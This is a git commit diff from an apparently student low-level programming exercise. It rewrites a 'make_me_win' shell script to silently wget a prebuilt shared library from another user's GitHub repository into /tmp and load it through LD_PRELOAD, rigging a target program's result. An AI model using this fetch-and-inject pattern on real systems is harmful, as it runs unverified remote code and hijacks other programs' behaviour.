d143b203767b077354de22bfa5eb7c0590acc2d7
HellenTs <hellentsegaye2@gmail.com>
2022-06-16 16:37:09 +0300

    my commit for dynamic libraries

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Karenahv/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/injectcode.so
-export LD_PRELOAD=/tmp/injectcode.so
+wget -q -O /tmp/cheatme.so https://github.com/rolandoquiroz/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/cheatme.so
+export LD_PRELOAD=/tmp/cheatme.so
